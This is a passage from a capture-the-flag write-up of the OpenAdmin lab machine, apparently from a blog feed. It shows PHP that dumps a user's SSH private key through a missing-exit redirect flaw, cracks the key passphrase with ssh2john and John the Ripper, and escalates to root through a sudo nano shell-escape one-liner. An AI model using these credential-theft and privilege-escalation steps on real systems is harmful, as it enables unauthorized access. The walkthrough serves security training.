<span class="c1"># Open Admin Trusted</span>
<span class="c1"># OpenAdmin</span>
<span class="nv">$output</span> <span class="o">=</span> shell_exec<span class="o">(</span><span class="s1">&#39;cat /home/joanna/.ssh/id_rsa&#39;</span><span class="o">)</span><span class="p">;</span>
<span class="nb">echo</span> <span class="s2">&#34;&lt;pre&gt;</span><span class="nv">$output</span><span class="s2">&lt;/pre&gt;&#34;</span><span class="p">;</span>
?&gt;
&lt;html&gt;
&lt;h3&gt;Don<span class="err">&#39;</span>t forget your <span class="s2">&#34;ninja&#34;</span> password&lt;/h3&gt;
Click here to <span class="nb">logout</span> &lt;a <span class="nv">href</span><span class="o">=</span><span class="s2">&#34;logout.php&#34;</span> <span class="nv">tite</span> <span class="o">=</span> <span class="s2">&#34;Logout&#34;</span>&gt;Session
&lt;/html&gt;
</code></pre></div><p>This line code has an improper redirection.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="o">&lt;?</span><span class="nx">php</span> <span class="nx">session_start</span><span class="p">();</span> 
	<span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nx">isset</span> <span class="p">(</span><span class="nv">$_SESSION</span><span class="p">[</span><span class="s1">&#39;username&#39;</span><span class="p">]))</span> <span class="p">{</span> 
		<span class="nx">header</span><span class="p">(</span><span class="s2">&#34;Location: /index.php&#34;</span><span class="p">);</span> 
        <span class="c1"># `die();` or `exit();` function should be called here.
</span><span class="c1"></span>	<span class="p">};</span>
<span class="o">...&lt;</span><span class="nx">SNIP</span><span class="o">&gt;...</span>
<span class="nv">$output</span> <span class="o">=</span> <span class="nx">shell_exec</span><span class="p">(</span><span class="s1">&#39;cat /home/joanna/.ssh/id_rsa&#39;</span><span class="p">);</span>
<span class="k">echo</span> <span class="s2">&#34;&lt;pre&gt;</span><span class="si">$output</span><span class="s2">&lt;/pre&gt;&#34;</span><span class="p">;</span>
<span class="cp">?&gt;</span><span class="err">
</span><span class="err">...&lt;SNIP&gt;...
</span></code></pre></div><p>The code above checks users' sessions but it&rsquo;s not complete yet because the <code>die()</code> or <code>exit()</code> function is missing, so the rest of the code below will be executed as well. Therefore, sending a normal request with <code>curl</code> (default without <code>-L</code> option) will prevent the page from redirection and then it renders <code>joanna</code>&rsquo;s SSH key.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">jimmy@openadmin:~$ curl -s http://127.0.0.1:52846/main.php
</code></pre></div><p><img class="img-container" src="imgs/ea391edd6c66409d8bb551eecdac08d5.png" alt="6b73c3ba7aa0ba3e068b85435dc8aeb1.png"  />
</p>
<h4 id="password-cracking">Password cracking</h4>
<p>The private key is encrypted with a password.  <code>JtR</code> can be used to crack an encrypted SSH key, but first, it must be converted to the hash form and this can be done by using <code>ssh2john.py</code></p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">→ root@iamf «openadmin» «10.10.14.7»
$ python ssh2john.py joanna_rsa &gt; joanna_rsa.hash
</code></pre></div><p>The password was successfully cracked within 17s. The cracking process is performed on my Windows machine.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-cmd" data-lang="cmd">john.exe user2.txt --wordlist=rockyou.txt
</code></pre></div><p><img class="img-container" src="imgs/fa7463b8239345409a2250597b3dfa69.png" alt="ca148e3ae5b2e8b65406e0d387ca1771.png"  />
</p>
<h4 id="ssh-access-1">SSH access</h4>
<p>Now I&rsquo;m able to login as user <code>joanna</code> via SSH.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">→ root@iamf «openadmin» «10.10.14.7»
$ ssh -i joanna_rsa joanna@10.10.10.171
</code></pre></div><p><img class="img-container" src="imgs/673cb008921d4eba886820c17fef43a0.png" alt="8f710060b1059b0ddb7cae2253e0c1ac.png"  />
</p>
<p>The user flag is done here.</p>
<h3 id="shell-as-root">Shell as root</h3>
<h4 id="abusing-sudo-nano">Abusing sudo nano</h4>
<p>User <code>joanna</code> has sudo privileges on <code>/bin/nano</code></p>
<blockquote>
<p>On linux boxes, whenever you own a valid user password, always check <code>sudo -l</code> !</p>
</blockquote>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">joanna@openadmin:~$ sudo -l
Matching Defaults entries <span class="k">for</span> joanna on openadmin:
    env_reset, mail_badpass, <span class="nv">secure_path</span><span class="o">=</span>/usr/local/sbin<span class="se">\:</span>/usr/local/bin<span class="se">\:</span>/usr/sbin<span class="se">\:</span>/usr/bin<span class="se">\:</span>/sbin<span class="se">\:</span>/bin<span class="se">\:</span>/snap/bin

User joanna may run the following commands on openadmin:
    <span class="o">(</span>ALL<span class="o">)</span> NOPASSWD: /bin/nano /opt/priv
</code></pre></div><p>A quick way to read the root flag is by issuing the command below,</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">joanna@openadmin:~$ sudo /bin/nano /opt/priv
</code></pre></div><p>and then hit <code>CTRL + R</code> to open a file, this allows us to read the root flag at  <code>/root/root.txt</code></p>
<center>
<p><img class="img-container" src="imgs/image-20210404121427744.png" alt="image-20210404121427744"  />
</p>
</center>
<p>To gain root shell, I&rsquo;ll follow the instruction from <a href="https://gtfobins.github.io/gtfobins/nano/">GTFOBins</a> page:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">joanna@openadmin:~$ sudo /bin/nano /opt/priv <span class="c1"># Opening nano as root</span>
^R^X <span class="c1"># CTRL+R (read/open file), CTRL+X(execute command)</span>
reset<span class="p">;</span> sh 1&gt;<span class="p">&amp;</span><span class="m">0</span> 2&gt;<span class="p">&amp;</span><span class="m">0</span> <span class="c1"># Escape from nano</span>
</code></pre></div>]]></content:encoded>
    </item>
    
  </channel>
</rss>
